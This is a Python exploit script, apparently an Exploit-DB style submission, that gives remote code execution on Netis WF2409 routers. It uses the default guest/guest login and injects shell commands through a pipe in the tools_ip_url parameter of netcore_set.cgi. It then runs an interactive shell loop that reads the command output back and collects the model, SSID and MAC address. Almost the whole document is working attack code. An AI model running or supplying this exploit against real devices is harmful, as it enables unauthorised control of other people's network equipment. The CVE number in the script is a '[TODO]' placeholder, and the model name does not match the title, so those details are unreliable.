# Exploit Title: Netis WF2409 3.3.42541 - Remote Code Execution
# Exploit Author: fleetyeets
# Cred: Elias Issa Netis WF2419 exploit
# Vendor Homepage: http://www.netis-systems.com
# Software Link: http://www.netis-systems.com/Suppory/downloads/dd/1/img/75
# Date: 2022-09-03
# Tested on: NETIS WF2409 V3.3.42541


# Proof of Concept: python netis_rce.py http://192.168.1.1 

#!/usr/bin/env python
import argparse
import requests
import re
import os
from requests.auth import HTTPBasicAuth

def exploit(host):
    # default creds
    # Send Payload
    cmd = ''
    headers_value={'User-Agent': 'Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0',  
            'Content-Type': 'application/x-www-form-urlencoded'}
    post_data="mode_name=netcore_set&tools_type=2&tools_ip_url=|& "+cmd+"&tools_cmd=1&net_tools_set=1&wlan_idx_num=0"
    vulnerable_page = "http://" + host + "/netcore_set.cgi"
    data_page = "http://" + host + "/netcore_get.cgi"
    req_payload = requests.post(vulnerable_page, data=post_data, headers=headers_value, auth = HTTPBasicAuth("guest", "guest"))
    mac_payload = requests.post(data_page, data=post_data, headers=headers_value, auth = HTTPBasicAuth("guest","guest"))
    print('[+] Payload sent')
    try :
        data = req_payload.text
        machine = mac_payload.text
        c_data = "mode_name=netcore_set&tools_type=2&tools_ip_url=|"+cmd+"&tools_cmd=1&net_tools_set=1&wlan_idx_num=0"
        router_model = str(re.findall('(version":"netis\([0-9a-zA-Z]{1,10}\))',machine)).replace('version":"','')
        ssid = str(re.findall('(wsc_ssid":"[0-9a-zA-Z ]{1,20})',machine)).replace('wsc_ssid":"','')
        bssid = str(re.findall('(lan_mac":"[0-9a-zA-Z:]{17})',machine)).replace('lan_mac":"','')
        if data:
#           print(data)
            print("Router Model: " + str(router_model))
            print("SSID: " + str(ssid))
            print("BSSID: " + str(bssid))
            while True:
                cmd = input(f"{router_model} $> ")
                if not cmd.strip():
                    continue
                if cmd.lower() == "exit":
                    break
                if cmd.lower() == "clear":
                    os.system('clear')
                results_page = "http://" + host + "/cgi-bin-igd/netcore_get.cgi"
                cmd_data2 = "mode_name=netcore_set&tools_type=2&tools_ip_url=|"+cmd+"&tools_cmd=1&net_tools_set=1&wlan_idx_num=0"
                req_payload2 = requests.post(vulnerable_page, data=cmd_data2, headers=headers_value, auth = HTTPBasicAuth("guest", "guest"))
                print(f"[+] {cmd} Payload sent")
                print(req_payload2.text)
                print("[+] Getting output...")
                results_post = "mode_name=netcore_get&noneed=noneed"
                req_result = requests.post(results_page, data=results_post, headers=headers_value, auth = HTTPBasicAuth("guest", "guest"))
                req_result = req_result.text
                cmd_o = re.findall('(tools_results":".+","NetMode)',req_result)
                cmd_o = str(cmd_o).replace('tools_results":"','').replace('","NetMode','').replace('Flag":"0\']','')
                cmd_o = cmd_o.replace(';','\n')
                print(cmd_o)



        else:
            print('[-] Exploit Failed')
    except Exception as e:
        print(e)
        print("[!] You might need to login.") 

def main():
    host = args.host
    exploit(host)

if __name__ == "__main__":
    ap = argparse.ArgumentParser(
            description="Netis WF2419 Remote Code Execution Exploit (CVE-2019-1337) [TODO]")
    ap.add_argument("host", help="URL (Example: http://192.168.1.1).")
    args = ap.parse_args()
    main()
